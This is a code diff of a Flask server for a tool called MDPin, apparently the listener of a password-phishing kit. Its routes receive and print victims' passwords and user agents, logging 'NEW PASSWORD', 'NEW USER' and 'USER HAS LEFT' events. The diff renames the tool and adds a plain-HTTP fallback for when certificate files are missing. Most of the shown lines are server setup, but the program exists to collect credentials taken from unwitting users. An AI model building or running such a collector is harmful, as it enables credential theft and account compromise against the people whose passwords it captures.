@@ -123,7 +123,7 @@ def welcome():
 	print("Server running on", f"{bcolors.FAIL}{ip}:{port}{bcolors.ENDC} with {bcolors.FAIL}{proto}{bcolors.ENDC}")
 	print(f"Server Address: {bcolors.FAIL}{ip}{bcolors.ENDC}, port:{bcolors.FAIL}{port}{bcolors.ENDC}, protocol:{bcolors.FAIL}{proto}://{bcolors.ENDC}")
 	print(f"Website Reachable on {bcolors.FAIL}{website}{bcolors.ENDC}")
-	print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","Waiting for a Connection...")
+	print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","Waiting for a Connection...")
 	print("\n")
 
 
@@ -142,17 +142,17 @@ log.setLevel(logging.ERROR)
 
 class newpass(Resource):
 	def get(self, passwd, useragent):
-		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW PASSWORD:","\033[1m\033[4m\033[91m",passwd,"\033[0m","FROM:\033[1m\033[4m\033[91m",useragent,"\033[0m")
+		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","NEW PASSWORD:","\033[1m\033[4m\033[91m",passwd,"\033[0m","FROM:\033[1m\033[4m\033[91m",useragent,"\033[0m")
 		return
 
 class newuser(Resource):
 	def get(self, useragent):
-		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW USER:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
+		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","NEW USER:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
 		return
 
 class left(Resource):
 	def get(self, useragent):
-		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","USER HAS LEFT:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
+		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","USER HAS LEFT:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
 		return		
 
 
@@ -169,28 +169,39 @@ api.add_resource(newpass, '/pass/<useragent>/<passwd>') # Route_3
 if __name__ == '__main__':
 	#welcome()
 	activate_job()
-	with open('config.json') as json_file:
-		data = json.load(json_file)
-		_key = data["key"]
-		_crt = data["crt"]
-		print("Using:\n",_crt,"\n",_key,"\n")
+	skiphttps=False
+	try:
+		with open('config.json') as json_file:
+			data = json.load(json_file)
+			_key = data["key"]
+			_crt = data["crt"]
+			print("Using:\n",_crt,"\n",_key,"\n")
+			context = (_crt,_key)
+	except:
+		print('Config.json was not found in current directory. Skipping HTTPS.')
+		_key = 'none'
+		_crt = 'none'
+		skiphttps=True
 		context = (_crt,_key)
-		try:
-			port = 8070
-			app.run(ssl_context=context,port='8070',host='0.0.0.0')
-		except Exception as ex:
-			try:
-				#func = request.environ.get('werkzeug.server.shutdown')
-				#func()
-				pass
-			except Exception as ee:
-				print(ee)
-			template = "An exception of type {0} occurred. Arguments:\n{1!r}"
-			message = template.format(type(ex).__name__, ex.args)
-		  #print(message)
-			if type(ex).__name__ == "FileNotFoundError":
-				print("\nCertificate files were not found! It's okay. MDPin's falling back to plain HTTP.")
-				port = 8075
-				app.run(port='8075',host='0.0.0.0')
 
-			
+
+	try:
+		port = 8070
+		app.run(ssl_context=context,port='8070',host='0.0.0.0')
+	except Exception as ex:
+		try:
+			#func = request.environ.get('werkzeug.server.shutdown')
+			#func()
+			pass
+		except Exception as ee:
+			print(ee)
+		template = "An exception of type {0} occurred. Arguments:\n{1!r}"
+		message = template.format(type(ex).__name__, ex.args)
+		#print(message)
+		if type(ex).__name__ == "FileNotFoundError":
+			if not skiphttps:
+				print("\nCertificate files were not found! It's okay. MDPin's falling back to plain HTTP.")
+			port = 8075
+			app.run(port='8075',host='0.0.0.0')
+
+		
